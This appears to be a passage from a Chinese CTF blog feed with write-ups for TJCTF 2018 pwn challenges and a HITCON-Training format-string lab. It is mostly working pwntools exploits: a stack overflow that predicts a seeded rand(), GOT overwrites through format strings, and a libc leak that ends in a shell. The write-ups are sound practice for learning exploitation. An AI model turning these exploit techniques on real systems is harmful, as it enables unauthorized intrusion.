class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from sys import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos; ]</span><br><span class="line"></span><br><span class="line">if argv[1] == &apos;l&apos;:</span><br><span class="line">    io = process(&apos;./strover&apos;)</span><br><span class="line">else:</span><br><span class="line">    io = remote(&apos;problem1.tjctf.org&apos;, 8002)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    io.sendline(&quot;A &quot;+str(i)*4)</span><br><span class="line"></span><br><span class="line">io.sendline( &quot;A &quot; + chr(400/4)*4 )</span><br><span class="line">io.sendline(&quot;F&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Future-Canary-Lab-points-80"><a href="#Future-Canary-Lab-points-80" class="headerlink" title="Future-Canary-Lab(points: 80)"></a>Future-Canary-Lab(points: 80)</h3><p>首先看下开了哪些保护，发现又是个栈溢出的题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec interview </span><br><span class="line">[*] &apos;/2018TJCTF/pwn-Future-Canary-Lab80/interview&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>首先main函数中<code>time(0)</code>获取当时系统时间，然后以此为随机数种子</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5rfpfhv0j30ge05g0sx.jpg" alt="img"></p><p>然后在interview函数中生成10个随机数，存在v1里，并copy一份给v3。</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fu5rrqferrj30g30ev75e.jpg" alt="img"></p><p>看下栈的情况会发现，v1处于ebp-0x10，s处于ebp-0x78，v3处于ebp-x038。</p><p>如果我们直接将s赋值一个很长的字符串+0xdeadbeef，那么原本和v1相等的v3则会被覆盖为我们的输入，造成check失败。所以我们应该构造一个包含这10个随机数的payload，再发过去就稳了。</p><blockquote><p>这里还有一个坑点是在<code>a1-i+j</code>这里，我们在输入s之后会把<code>i</code>和<code>j</code>的值也覆盖掉，由于之后<code>j</code>还会被赋值为10，所以<code>i</code>还是我们输入的值，那么<code>a1</code>我们就不能传<code>0xdeadbeef</code>。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &apos;l&apos;:</span><br><span class="line">    io = process(&apos;./test&apos;)</span><br><span class="line">else:</span><br><span class="line">    io = remote(&apos;problem1.tjctf.org&apos;, 8000)</span><br><span class="line"></span><br><span class="line">dll = ctypes.CDLL(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) </span><br><span class="line"></span><br><span class="line">v4 = dll.time(0)</span><br><span class="line">#print v4</span><br><span class="line">dll.srand(v4)</span><br><span class="line">v3 = [ dll.rand()  for i in range(10) ]</span><br><span class="line">payload = &apos;\x11&apos;*(0x40)</span><br><span class="line">for i in v3:</span><br><span class="line">    payload += p32(i)</span><br><span class="line">payload += &apos;\x11&apos;*(0x18)</span><br><span class="line">payload += p32(0xdeadbeef+0x11111111-10)</span><br><span class="line">#info(payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Online-Banking-points-100"><a href="#Online-Banking-points-100" class="headerlink" title="Online-Banking(points: 100)"></a>Online-Banking(points: 100)</h3><h3 id="Secure-Secrets-points-110"><a href="#Secure-Secrets-points-110" class="headerlink" title="Secure-Secrets(points: 110)"></a>Secure-Secrets(points: 110)</h3><p>先看看开了哪些保护，发现除了地址随机化都有:-(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec secure </span><br><span class="line">[*] &apos;/2018TJCTF/pwn-Secure-Secrets110/secure&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>用ida看伪代码会发现<code>get_message</code>函数存在明显的格式化字符串漏洞</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fu5s3ylrt9j30fm08p0tb.jpg" alt="img"></p><p>并且<code>get_secret</code>函数可以直接拿到flag</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5s4ijdwej309m08gq3c.jpg" alt="img"></p><p>那么目的就很明确了，通过fsb的任意地址写将<code>exit</code>函数覆盖为<code>get_secret</code>的地址即可拿到flag:-)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from sys import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if argv[1] == &apos;l&apos;:</span><br><span class="line">    io = process(&apos;./secure&apos;)</span><br><span class="line">else:</span><br><span class="line">    io = remote(&apos;problem1.tjctf.org&apos;, 8008)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./secure&apos;)</span><br><span class="line"></span><br><span class="line">def send_message(payload):</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(&apos;&gt; &apos;,&apos;666&apos;)</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(&apos;&gt; &apos;,payload)</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(&apos;&gt; &apos;,&apos;666&apos;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def loop_it():</span><br><span class="line">    </span><br><span class="line">    main_addr = elf.symbols[&apos;main&apos;]</span><br><span class="line">    exit_got = elf.got[&apos;exit&apos;]</span><br><span class="line">#print &quot;[+]exit_got = &#123;&#125;&quot;.format(hex(exit_got))</span><br><span class="line">    payload = p32(elf.got[&apos;printf&apos;]) + &apos;%&apos; + str((main_addr&amp;0xffff)-4) + &apos;c%35$hn&apos;</span><br><span class="line">    </span><br><span class="line">    info(payload)</span><br><span class="line">    send_message(payload)</span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line"></span><br><span class="line">    flag_addr = elf.sym[&apos;get_secret&apos;]</span><br><span class="line">    </span><br><span class="line">    payload = p32(elf.got[&apos;exit&apos;]) + &apos;%&apos; + str((flag_addr&amp;0xffff)-4) + &apos;c%35$hn&apos;</span><br><span class="line">#payload = fmtstr_payload( 35, &#123;printf_got:flag_addr&#125; )</span><br><span class="line">    send_message(payload)</span><br><span class="line">    io.recv()</span><br><span class="line">    </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    #loop_it()</span><br><span class="line">    get_flag()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h3 id="Super-Secure-Secrets-points-140"><a href="#Super-Secure-Secrets-points-140" class="headerlink" title="Super-Secure-Secrets(points: 140)"></a>Super-Secure-Secrets(points: 140)</h3><p>64位格式化字符串的题目，第一次做64位的，给坑了很久。。</p><p>简单分析一下程序，<code>set_message</code>用来存payload</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu84kl3dppj30h40bxdh0.jpg" alt="img"></p><p><code>get_message</code>中有fsb，可以用它来达到任意地址读和任意地址写，并且由于程序只能执行一次get_message操作，我们可以通过将<code>memset</code>的got表的真实地址覆盖成<code>_start</code>的地址达到循环的目的。</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu84l4py20j30w10l977v.jpg" alt="img"></p><p>当我们能够无限次利用fsb的时候，常规操作一通上基本就稳了。</p><blockquote><p>常规操作：</p><ol><li>泄露两个函数的真实地址从而确定libc版本</li><li>通过libc得到system函数的真实地址</li><li>将printf的真实地址覆盖为system的真实地址</li><li>传””/bin/sh\0”从而getshell</li></ol></blockquote><p><strong>一些64位程序的坑</strong>：</p><ul><li>这里由于程序是64位，传参顺序为rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以在计算偏移时应在栈的基础上加6。</li><li>由于64位程序的地址的高字节都是<code>\x00</code>，如果放在payload前面会把后面的截断，所以传地址时应放在payload的最后面。</li></ul><p><strong>一个关于优先级的坑(之前给坑过，写着这题又忘了…)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a = 0x1234</span><br><span class="line">&gt;&gt;&gt; ((a&gt;&gt;8)&amp;0xff)-4 // 预期结果</span><br><span class="line">14</span><br><span class="line">&gt;&gt;&gt; (a&gt;&gt;8)&amp;(0xff-4) // 非预期结果</span><br><span class="line">18</span><br><span class="line">&gt;&gt;&gt; (a&gt;&gt;8)&amp;0xff-4 // 非预期结果</span><br><span class="line">18</span><br></pre></td></tr></table></figure><p>那么开始解题拿flag:-)</p><p>首先泄露libc，这个可以在没loop之前得到，跑两次就行了。</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu859upxflj30op09d74j.jpg" alt="img"></p><p>然后就让程序循环，利用got表可写的特性将memset的真实地址覆盖为_start，这里_start其实就是程序的入口点，它负责调用main函数。接着泄露一次printf的真实地址，计算得到system的真实地址，再构造payload将printf覆盖为system。最后传<code>&quot;/bin/sh\0&quot;</code>，<code>get_message</code>的<code>printf(a)</code>实际上就是<code>system(&quot;/bin/sh&quot;)</code>。</p><p>exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from sys import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos; ]</span><br><span class="line">context.binary = &apos;./super_secure&apos;</span><br><span class="line"></span><br><span class="line">elf = context.binary</span><br><span class="line">if argv[1] == &apos;l&apos;:</span><br><span class="line">    io = process(&apos;./super_secure&apos;)</span><br><span class="line">    libc = elf.libc</span><br><span class="line">else:</span><br><span class="line">    io = remote(&apos;problem1.tjctf.org&apos;, 8009)</span><br><span class="line">    libc = ELF(&apos;./libc6_2.27-3ubuntu1_amd64.so&apos;)</span><br><span class="line"></span><br><span class="line">def DEBUG():</span><br><span class="line">    gdb.attach(io,&apos;b *0x400c60\nb *0x400CD5\nc\n&apos;)</span><br><span class="line"></span><br><span class="line">def mysend(payload,flag=False):</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(&quot;&gt; &quot;,&quot;s&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:\n&quot;,&quot;111111&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:\n&quot;,payload)</span><br><span class="line">    </span><br><span class="line">    io.sendlineafter(&quot;&gt; &quot;,&quot;v&quot;)</span><br><span class="line">    io.sendlineafter(&quot;:\n&quot;,&quot;111111&quot;)</span><br><span class="line">    if not flag:</span><br><span class="line">        io.sendline(&quot;f**kyo&quot;)</span><br><span class="line"></span><br><span class="line">def set_to_memset():</span><br><span class="line">    </span><br><span class="line">    payload = (&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(elf.sym[&quot;_start&quot;]&amp;0xffff,28)).ljust(16,&apos;+&apos;) + p64(elf.got[&apos;memset&apos;])</span><br><span class="line">    mysend(payload)</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line"></span><br><span class="line">    payload = &quot;++%27$s+&quot; + p64(addr)</span><br><span class="line">    mysend(payload)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(&quot;++&quot;)</span><br><span class="line">    real_addr = io.recvuntil(&quot;+&quot;)[:-1]</span><br><span class="line">    real_addr = u64( real_addr + &quot;\x00&quot;*(8-len(real_addr)) )</span><br><span class="line"></span><br><span class="line">    print hex(real_addr)</span><br><span class="line">    return real_addr </span><br><span class="line"></span><br><span class="line">def printf_to_system(printf_addr):</span><br><span class="line"></span><br><span class="line">    system_addr = libc.sym[&apos;system&apos;] + printf_addr - libc.sym[&apos;printf&apos;]</span><br><span class="line">    print hex(system_addr),hex(printf_addr)</span><br><span class="line"></span><br><span class="line">    payload = (&quot;%&#123;&#125;c%30$hhn&quot;.format(system_addr&amp;0xff)).ljust(16,&apos;+&apos;)</span><br><span class="line">    payload += (&quot;%&#123;&#125;c%31$hn&quot;.format( ((system_addr&gt;&gt;8)&amp;0xffff) - (system_addr&amp;0xff) - 5 )).ljust(16,&apos;+&apos;)</span><br><span class="line">    payload += p64( elf.got[&apos;printf&apos;] ) + p64( elf.got[&apos;printf&apos;]+1 )</span><br><span class="line">    info(payload)</span><br><span class="line">#DEBUG()</span><br><span class="line">    mysend(payload)</span><br><span class="line">    </span><br><span class="line">    io.sendline(&quot;s&quot;)</span><br><span class="line">    io.sendline(&quot;111111&quot;)</span><br><span class="line">    io.sendline(&quot;/bin/sh\0&quot;)</span><br><span class="line"></span><br><span class="line">    io.sendline(&quot;v&quot;)</span><br><span class="line">    io.sendline(&quot;111111&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">    set_to_memset()</span><br><span class="line">    printf_addr = leak(elf.got[&apos;printf&apos;])</span><br><span class="line">    printf_to_system(printf_addr)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>在线libc-database：<a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></li><li>_start的作用：<a href="https://stackoverflow.com/questions/29694564/what-is-the-use-of-start-in-c" target="_blank" rel="noopener">https://stackoverflow.com/questions/29694564/what-is-the-use-of-start-in-c</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Unsolved: pwn-Online-Banking&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h2&gt;&lt;h3 id=&quot;Validator-points-30&quot;&gt;&lt;a href=&quot;#Validator-points-30&quot; class=&quot;headerlink&quot; title=&quot;Validator(points: 30)&quot;&gt;&lt;/a&gt;Validator(points: 30)&lt;/h3&gt;&lt;p&gt;首先file看一下&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;▶ file flagcheck &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;flagcheck: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=89bdc886ab26b531450aa6ecb741b66a060b7605, not stripped&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;用ida看伪代码会发现是明文比较，如下图。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Reverse" scheme="https://l1b0.fun/tags/Reverse/"/>
    
      <category term="Pwn" scheme="https://l1b0.fun/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Format-String-Bug-Training</title>
    <link href="https://l1b0.fun/2018/08/08/Format-String-Bug-Training/"/>
    <id>https://l1b0.fun/2018/08/08/Format-String-Bug-Training/</id>
    <published>2018-08-08T12:22:30.000Z</published>
    <updated>2019-09-17T12:23:23.920Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目地址：<a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="noopener">https://github.com/scwuaptx/HITCON-Training</a></p></blockquote><h3 id="HITCON-Training-lab7"><a href="#HITCON-Training-lab7" class="headerlink" title="HITCON-Training-lab7"></a>HITCON-Training-lab7</h3><p>首先<code>checksec</code>一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec crack </span><br><span class="line">[*] &apos;HITCON-Training-master/LAB/lab7/crack&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开了栈保护，NX保护(shellcode不可执行)，但没开PIE(地址不随机化)</p><p>用IDA看下伪代码可以发现<code>printf(&amp;buf)</code>，典型的<code>Format String Bug</code></p><p>分析代码发现只要知道了随机化的password即可得到flag，所以这里只用实现<strong>任意地址的读</strong>，当然也有其他方法。</p><a id="more"></a><blockquote><p>%x和%p都是直接打印16进制数据，不同在于%p会在数据前面加上0x</p><p>%s是把数据当做地址取其内容以字符串的形式输出</p><p>(其实这是c语言的内容，但是放到pwn里面我…想了很久，是真的菜)</p><p>要实现读取地址指向的数据一般用<code>%s</code></p></blockquote><h4 id="任意地址读-leak-passwd-value"><a href="#任意地址读-leak-passwd-value" class="headerlink" title="任意地址读-leak_passwd_value"></a>任意地址读-leak_passwd_value</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line">#read_anything:leak_passwd_value</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./crack&apos;)</span><br><span class="line"></span><br><span class="line">passwd_addr = 0x804a048</span><br><span class="line"></span><br><span class="line">payload = p32(passwd_addr) + &apos;+&apos; + &apos;%10$s&apos; + &apos;+&apos;</span><br><span class="line">io.sendlineafter(&quot;? &quot;,payload)</span><br><span class="line">io.recvuntil(&apos;+&apos;)</span><br><span class="line">passwd = io.recvuntil(&apos;+&apos;)</span><br><span class="line">print passwd</span><br><span class="line">passwd = u32(passwd[:4])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;:&quot;,str(passwd))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="任意地址写-change-passwd-value"><a href="#任意地址写-change-passwd-value" class="headerlink" title="任意地址写-change_passwd_value"></a>任意地址写-change_passwd_value</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line">#write_anything1:change_passwd_value</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./crack&apos;)</span><br><span class="line"></span><br><span class="line">passwd_addr = 0x804a048</span><br><span class="line">payload = fmtstr_payload( 10, &#123;passwd_addr:233&#125; )</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;? &quot;,payload)</span><br><span class="line">io.sendlineafter(&quot;:&quot;,&apos;233&apos;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="任意地址写-change-printf-addr"><a href="#任意地址写-change-printf-addr" class="headerlink" title="任意地址写-change_printf_addr"></a>任意地址写-change_printf_addr</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line">#write_anything2:change_printf_addr</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./crack&apos;)</span><br><span class="line">elf = ELF(&apos;./crack&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&apos;printf&apos;]</span><br><span class="line">cat_flag_addr = 0x8048725</span><br><span class="line">payload = fmtstr_payload( 10, &#123;printf_got:cat_flag_addr&#125; )</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;? &quot;,payload)</span><br><span class="line">io.sendline(&apos;666&apos;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="HITCON-Training-lab9"><a href="#HITCON-Training-lab9" class="headerlink" title="HITCON-Training-lab9"></a>HITCON-Training-lab9</h3><p>用IDA看源码能看到有个函数叫<code>do_fmt</code>，其伪代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int do_fmt()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, buf, 0xC8u);</span><br><span class="line">    result = strncmp(buf, &quot;quit&quot;, 4u);</span><br><span class="line">    if ( !result )</span><br><span class="line">      break;</span><br><span class="line">    printf(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于这里的<code>buf</code>是<strong>全局变量</strong>，位于<code>bss段</code>；而<code>lab7</code>中的<code>buf</code>是<strong>局部变量</strong>，在栈上。</p><blockquote><p>关于这两个的区别详见：<a href="https://blog.csdn.net/Fortware/article/details/79311059" target="_blank" rel="noopener">https://blog.csdn.net/Fortware/article/details/79311059</a></p></blockquote><p>这时我们不能直接通过<code>buf</code>将<code>printf</code>覆盖为<code>system</code>，但是可以控制栈上的其它数据达到同样的效果。</p><p>通过gdb调试，在<code>0x08048533</code>处下断点，看下栈上的分布</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 20</span><br><span class="line">00:0000│ esp  0xffffd3e0 —▸ 0x804a060 (buf) ◂— &apos;\naaa\n&apos;</span><br><span class="line">01:0004│      0xffffd3e4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd3e8 ◂— 0x4</span><br><span class="line">03:000c│      